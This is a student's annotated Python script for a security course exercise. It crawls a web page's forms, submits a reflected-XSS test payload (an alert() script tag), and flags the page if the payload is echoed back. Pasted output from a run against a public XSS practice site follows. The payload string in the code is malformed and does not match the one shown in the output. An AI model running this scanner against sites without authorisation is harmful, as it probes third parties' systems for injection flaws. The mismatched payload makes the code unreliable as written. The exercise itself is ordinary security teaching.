#!/usr/bin/env python3

# Author:      Abdou Rockikz
# Description: TODO: BeautifulSoup Analysis 
# Date:        TODO: 11/25/20
# Modified by: TODO: Dom Moore

### TODO: Install requests bs4 before executing this in Python3

# Import libraries

import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

# Declare functions

### TODO: Add function explanation here ###
'''
The get_all_forms functions targets html forms, the request get directs to the specified url, once
on the url, the content crawling the page looking for forms. 

'''
### In your own words, describe the purpose of this function as it relates to the overall objectives of the script ###
def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

### TODO: Add function explanation here ###
'''
the get forms details function creates an list that will placed in the called details attrbutes and looks lowercase,
and does the same as the method variable buy uses it as a method. it also creates a dictionary called inputs
after wards it starts a for loop that takes the inputs from the variables into the pair as a dictionary,
catogorized the input into a variable and returns the details of the crawled input.

'''
### In your own words, describe the purpose of this function as it relates to the overall objectives of the script ###
def get_form_details(form):
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

### TODO: Add function explanation here ###
'''
the submit form function takes in three parameters, the urljoin will join a base url with another url giving a 
navigating to a particular network location and path, on this page it will input information from form details and 
take an action. it will gathrer that information into a data list, returning the data the targeted url. 
'''
### In your own words, describe the purpose of this function as it relates to the overall objectives of the script ###
def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

### TODO: Add function explanation here ###
'''
the scan xss function, takes the urls fronm the get url variaable called earlier in the script. It prints
the positive number of the listed urls with the the length of if form in the urls. one it identifies a form it
inputs the script from the js script variable. the next step is that it begins the for loop that test test the 
sj scripts and prints out any positive detections and the details of the dectection.

'''
### In your own words, describe the purpose of this function as it relates to the overall objectives of the script ###
def scan_xss(url):
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    js_script = "<script  > alert("ops chellenge str(38) ")</ script>" ### TODO: Add HTTP and JS code here that will cause a XSS-vulnerable field to create an alert prompt with some text.
    is_vulnerable = False
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            pprint(form_details)
            is_vulnerable = True
    return is_vulnerable

# Main

### TODO: Add main explanation here ###
'''
the main starts the script, starting with asking for an input for the website that you want to test 
your script on and printing out the various print statments that are consistent with the functions. 

'''
### In your own words, describe the purpose of this main as it relates to the overall objectives of the script ###
if __name__ == "__main__":
    url = input("Enter a URL to test for XSS:") 
    print(scan_xss(url))

### TODO: When you have finished annotating this script with your own comments, copy it to Web Security Dojo
### TODO: Test this script against one XSS-positive target and one XSS-negative target
### TODO: Paste the outputs here as comments in this script, clearling indicating which is positive detection and negative detection
'''
dojo@dojo-VirtualBox:~$ python3 ops37.py 
Enter a URL to test for XSS:https://xss-game.appspot.com/level1/frame
[+] Detected 1 forms on https://xss-game.appspot.com/level1/frame.
[+] XSS Detected on https://xss-game.appspot.com/level1/frame
[*] Form details:
{'action': '',
 'inputs': [{'name': 'query',
             'type': 'text',
             'value': "<Script>alert('ops challenge 38')</scripT>"},
            {'name': None, 'type': 'submit'}],
 'method': 'get'}
True
dojo@dojo-Virtua

#####################################################





'''